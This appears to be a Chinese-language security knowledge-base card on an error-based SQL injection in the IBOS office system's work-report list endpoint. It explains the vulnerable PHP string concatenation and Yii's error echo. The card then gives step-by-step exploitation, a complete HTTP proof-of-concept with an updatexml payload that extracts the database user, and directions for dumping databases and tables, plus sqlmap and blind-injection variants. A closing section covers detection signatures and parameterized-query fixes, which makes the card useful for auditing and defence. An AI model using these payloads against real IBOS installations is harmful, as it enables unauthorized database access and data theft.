---
id: web-generic-sqli-ibos-report-getlist-keyword-updatexml
title: IBOS 工作汇报列表 keyword.subject 拼接 LIKE：Yii 异常页回显 updatexml 报错注入
type: scenario
domain: web
path: web/generic/sqli
technique: ibos-report-getlist-keyword-error-based-sqli
tags:
- php
- ibos
- sqli
- error-based
- updatexml
- yii
- oa
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V640
  verified_at: '2026-11-13T02:26:40+08:00'
  notes: 已对照原文与截图核对：实际路由为 /?r=report/api/getlist（已修正卡内 gtp/getList 笔误）、actions() 映射 getlist=>report\actions\api\GetList、getListCondition 中 subject LIKE '%{keyword}%' 字符串拼接、type 白名单 receive/send/unread、图23 updatexml 报错回显 ~root@localhost~ 均一致。未验证点：未复跑 PoC；需登录态；原文未标注 affected_versions；无 sources/source_url。
url: /docs/web/generic/sqli/web-generic-sqli-ibos-report-getlist-keyword-updatexml/
draft: false
kb_aliases:
- IBOS 工作汇报 SQL 注入
- report/api/getlist 注入
- keyword.subject 注入
- IBOS updatexml 报错注入
---

## 一句话结论

IBOS 工作汇报列表接口 `/?r=report/api/getlist` 把 JSON 请求体中的 `keyword.subject`（以及 `keyword.starttime/endtime/author/name` 等）直接拼接进 `AND \`subject\` LIKE '%...%'` 等 SQL 条件，未做参数化或转义；由于 Yii 的异常处理会把数据库报错信息回显/记录到响应，用 `updatexml()`/`extractvalue()` 可在错误信息中回读任意查询结果，构成报错注入。

## 原理

- 路由：`ApiController::actionS()` 维护动作映射表，`getlist` 映射到 `application\modules\report\actions\api\GetList`；`GetList::run()` 读取 `$data['keyword']` 后调用 `ReportUtil::getListCondition($type, $uid, $keyword)`。
- `getListCondition()` 中多段条件为字符串拼接，例如：
  ```php
  if (!empty($keyword['subject'])) {
      $condition .= "AND `subject` LIKE '%{$keyword['subject']}%' ";
  }
  ```
  `starttime`、`endtime`、`author`、`name` 同样直接插入 SQL。
- 拼接结果交给 `Report::model()->getReportByCondition($condition, $limit, $offset)`，最终由 Yii 的 `CDbCommand::buildQuery()` 拼出完整 SQL 并执行；注入点位于字符串上下文（`LIKE '%...%'`），可用 `'` 闭合。
- 报错回显原理：Yii 的 `handleException()` 把异常 `_toString()`（含 `CDbCommand 无法执行 SQL 语句: SQLSTATE...` 与原始 SQL）写入日志并渲染错误页；MySQL 的 `updatexml()` 报错把查询结果带入 `XPATH syntax error: '~...~'` 消息，因此响应中可直接看到数据。

## 触发条件

- 已登录 IBOS（工作汇报为登录后功能；文章用超级管理员测试，普通用户能否访问取决于权限配置）。
- 接口 `/?r=report/api/getlist` 接受 JSON POST，`type` 在允许值（receive/send/unread）内。
- 目标 MySQL 版本支持 `updatexml()`（5.1+，5.7 之前；8.0 需换 `extractvalue` 或其它报错函数）。
- Yii 错误页对请求方可见（debug 模式或错误信息未被隐藏）。

## 利用步骤

1. 登录后访问"工作汇报"页面，搜索框输入 `1111'` 观察报错（页面提示 SQL 错误）。
2. Burp 抓取搜索请求：`POST /?r=report/api/getlist`，JSON body 形如 `{"limit":10,"offset":0,"type":"send","keyword":{"subject":"1111'"}}`。
3. 将 `keyword.subject` 替换为报错注入 payload：
   ```
   ' ) AND (updatexml(1,concat(0x7e,(select user()),0x7e),1)) -- 
   ```
   响应返回 `XPATH syntax error: '~root@localhost~'`。
4. 替换子查询即可回读库名（`select database()`）、表名、字段值等；将 payload 放入 `keyword.name`、`keyword.author` 等参数同样可注入（同为拼接）。
5. 也可用 sqlmap 对该 JSON 参数定点测试（文章记录过 sqlmap 对某点位判定不可注入，说明不同参数/类型分支防护不一致，需逐个验证）。

## PoC

```http
POST /?r=report/api/getlist HTTP/1.1
Host: <target>
Content-Type: application/json

{"limit":10,"offset":0,"type":"send","keyword":{"subject":"' ) AND (updatexml(1,concat(0x7e,(select user()),0x7e),1)) -- "}}
```

说明：`type` 必须是 receive/send/unread 之一（源码白名单），否则返回错误。不访问、不执行原文目标。

## 变体与关联

- 同产品另一处报错注入：文件柜下载 `fid` 参数，见 [[web-generic-sqli-ibos-file-company-ajaxent-fid-updatexml]]。
- 同类审计模式：Yii 1.x 中 `CDbCommand`/`CDbCriteria` 的 `condition` 字符串拼接（`addCondition`、`where` 原始字符串）是常见注入面；报错回显依赖 `handleException` 的 `_toString()`。
- 变体：若目标关闭错误显示，可改用布尔/时间盲注；MySQL 8.0 用 `extractvalue(1,concat(0x7e,...))` 或 `GTID_SUBSET` 等报错函数。

## 检测与防御

- 检测：请求体 JSON 中出现 `updatexml`、`extractvalue`、`concat(0x7e`、`--` 等特征；搜索接口返回内容含 `XPATH syntax error`。
- 检测：同账号短时间内对 `report/api/getlist` 的高频异常请求；SQL 错误日志中出现语法错误。
- 防御：全部改为参数化查询 / `CDbCriteria` 的 `addCondition` 绑定参数（`params`），禁止字符串拼接用户输入；对 `LIKE` 通配字符做转义。
- 防御：生产环境关闭 Yii debug、不向客户端展示异常详情；最小化数据库账号权限；WAF 拦截报错注入特征。
